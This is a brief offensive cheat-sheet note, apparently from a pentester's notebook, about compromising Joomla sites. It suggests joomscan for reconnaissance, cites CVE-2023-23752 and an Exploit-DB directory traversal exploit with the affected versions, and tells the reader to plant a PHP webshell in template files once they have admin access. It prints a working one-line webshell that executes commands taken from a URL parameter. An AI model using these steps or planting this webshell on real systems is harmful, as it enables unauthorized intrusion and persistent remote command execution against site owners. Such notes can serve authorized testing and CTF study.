Use joomscan to gather info

[[CVE-2023-23752]] - up to 4.26

Directory Traversal
https://www.exploit-db.com/exploits/46710 - 1.5 through 3.9.4

If you get admin access you can add a php webshell to any of the .php files under 'templates':

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```



